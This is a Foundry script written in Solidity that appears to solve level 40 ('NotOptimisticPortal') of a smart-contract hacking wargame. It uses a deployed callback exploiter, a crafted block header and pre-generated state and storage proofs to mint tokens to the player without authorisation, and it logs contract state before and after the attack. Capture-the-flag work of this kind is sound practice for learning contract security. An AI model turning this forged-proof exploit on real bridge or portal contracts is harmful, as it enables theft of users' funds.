// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../../../src/levels/40_NotOptimisticPortal/CallbackExploiter.sol";

/**
 * @title Execute NotOptimisticPortal Attack
 * @notice This script executes the complete attack with pre-generated proofs
 */
contract ExecuteAttackScript is Script {
    // Deployed CallbackExploiter address
    address constant EXPLOITER = 0x78deAe9b662E84cB74de0592bda3b871f747FCB9;

    function run() external {
        address portalAddress = vm.envAddress("NOTOPTIMISTICPORTAL_TARGET");
        address player = vm.envAddress("PLAYER_ADDRESS");

        INotOptimisticPortal portal = INotOptimisticPortal(portalAddress);
        CallbackExploiter exploiter = CallbackExploiter(EXPLOITER);

        console.log("========================================");
        console.log("NotOptimisticPortal Attack Execution");
        console.log("========================================");
        console.log("Portal:", portalAddress);
        console.log("Player:", player);
        console.log("Exploiter:", EXPLOITER);

        // Display current state
        console.log("\n--- Before Attack ---");
        console.log("Owner:", portal.owner());
        console.log("Sequencer:", portal.sequencer());
        console.log("Buffer Counter:", portal.bufferCounter());
        console.log("Player Balance:", portal.balanceOf(player));

        // Pre-generated attack data
        bytes memory rlpBlockHeader = hex"f901f9a0ed20f024a9b5b75b1dd37fe6c96b829ed766d78103b3ab8f442f3b2ebbc557b9a01dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347940000000000000000000000000000000000000000a0babcc4e7460fae7b54f1aab4c3930cb6443c1180adc26860c442221a1808d867a056e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421a056e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421b90100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008084039fd3998401c9c38080845fc6305880a00000000000000000000000000000000000000000000000000000000000000000880000000000000000";
        bytes memory stateTrieProof = hex"f86eb86cf86aa120352a47fc6863b89a6b51890ef3c1550d560886c027141d2058ba1e2d4c66d99ab846f8440000a094d4944f152a8043690ef61b743e7ca158bf11b37125a58cc3f286411372a850a0c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470";
        bytes memory storageTrieProof = hex"e5a4e3a120cf455740b004285d0b61d7115f2b34fbc68df9c9f70ae0d7b11bf8cc65d6ab1501";
        bytes memory accountStateRlp = hex"f8440000a094d4944f152a8043690ef61b743e7ca158bf11b37125a58cc3f286411372a850a0c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470";

        uint256 amount = 1 ether; // Amount of tokens to mint
        uint256 salt = 0;
        uint16 bufferIndex = portal.bufferCounter(); // Points to our new state root after submitNewBlock

        // Compute the expected withdrawal hash
        bytes32 withdrawalHash = exploiter.computeWithdrawalHash(amount, salt);
        console.log("\nWithdrawal Hash:", vm.toString(withdrawalHash));
        console.log("Expected: 0x7081a32cfe2c96f6a8768beef20a12682086b40668ec48b5d9b877e90b406cdc");

        vm.startBroadcast();

        // Step 1: Set the block header on the exploiter
        console.log("\nStep 1: Setting block header on exploiter...");
        exploiter.setBlockHeader(rlpBlockHeader);
        console.log("Block header set!");

        // Step 2: Execute the attack
        console.log("\nStep 2: Executing attack...");
        INotOptimisticPortal.ProofData memory proofs = INotOptimisticPortal.ProofData({
            stateTrieProof: stateTrieProof,
            storageTrieProof: storageTrieProof,
            accountStateRlp: accountStateRlp
        });

        exploiter.attack(amount, salt, proofs, bufferIndex);
        console.log("Attack executed!");

        vm.stopBroadcast();

        // Verify results
        console.log("\n--- After Attack ---");
        console.log("Owner:", portal.owner());
        console.log("Sequencer:", portal.sequencer());
        console.log("Player Balance:", portal.balanceOf(player));

        if (portal.balanceOf(player) > 0) {
            console.log("\n========================================");
            console.log("SUCCESS! Tokens minted to player!");
            console.log("========================================");
        }
    }
}
